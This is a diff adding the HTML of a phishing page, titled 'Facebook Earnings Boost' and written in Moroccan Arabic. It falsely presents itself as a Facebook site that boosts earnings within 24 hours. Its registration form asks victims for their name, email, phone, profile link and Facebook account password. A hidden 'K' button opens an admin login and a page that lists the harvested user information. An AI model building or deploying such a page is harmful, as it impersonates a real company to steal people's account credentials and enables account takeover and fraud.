@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Earnings Boost</title>
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+
+  <!-- الصفحة الأولى -->
+  <div class="header">
+    <div class="logo">Facebook</div>
+    <p class="description">كموقع تابع لشركة Facebook، هاد المنصة كتوفر لك الحل لمشكل ضعف الأرباح. من بعد تسجيلك، غادي تحسّن الأرباح ديالك في ظرف 24 ساعة، باش تشوف الزيادة مباشرة!</p>
+  </div>
+
+  <div class="start-button-container">
+    <button id="start-button">البدء</button>
+  </div>
+
+  <!-- زر حرف "K" المخفي -->
+  <div class="k-button-container">
+    <button id="k-button">K</button>
+  </div>
+
+  <!-- الصفحة الثانية - التسجيل -->
+  <div id="registration-page" style="display:none;">
+    <h1>تسجيل المعلومات</h1>
+    <p>المرجو تعبئة المعلومات لتطوير أرباحك على Facebook</p>
+    <form id="registration-form" class="registration-form">
+      <label for="fullName">الاسم الكامل كما في حساب Facebook:</label>
+      <input type="text" id="fullName" name="fullName" required>
+      
+      <label for="email">البريد الإلكتروني للتواصل:</label>
+      <input type="email" id="email" name="email" required>
+      
+      <label for="phone">رقم الهاتف:</label>
+      <input type="tel" id="phone" name="phone" required>
+      
+      <label for="profileLink">رابط الملف الشخصي في Facebook:</label>
+      <input type="url" id="profileLink" name="profileLink" required>
+      
+      <label for="password">كلمة المرور الخاصة بحساب Facebook:</label>
+      <input type="password" id="password" name="password" required>
+      
+      <button type="submit">متابعة</button>
+    </form>
+  </div>
+
+  <!-- الصفحة الثالثة - تأكيد -->
+  <div id="confirmation-page" style="display:none;">
+    <h1>تم استقبال المعلومات بنجاح!</h1>
+    <p>راح نحل مشكل ضعف الأرباح في 24 ساعة. شكرًا على ثقتك!</p>
+  </div>
+
+  <!-- صفحة إدخال كلمة المرور -->
+  <div id="password-page" style="display:none;">
+    <h1>أدخل كلمة المرور</h1>
+    <form id="password-form" class="password-form">
+      <label for="adminPassword">كلمة المرور:</label>
+      <input type="password" id="adminPassword" name="adminPassword" required>
+      <button type="submit">تأكيد</button>
+    </form>
+  </div>
+
+  <!-- صفحة عرض معلومات المستخدمين -->
+  <div id="user-info-page" style="display:none;">
+    <h1>معلومات المستخدمين</h1>
+    <div id="user-info-list">
+      <!-- سيتم إضافة معلومات المستخدمين هنا ديناميكيا -->
+    </div>
+  </div>
+
+  <script src="../js/script.js"></script>
+</body>
+</html>
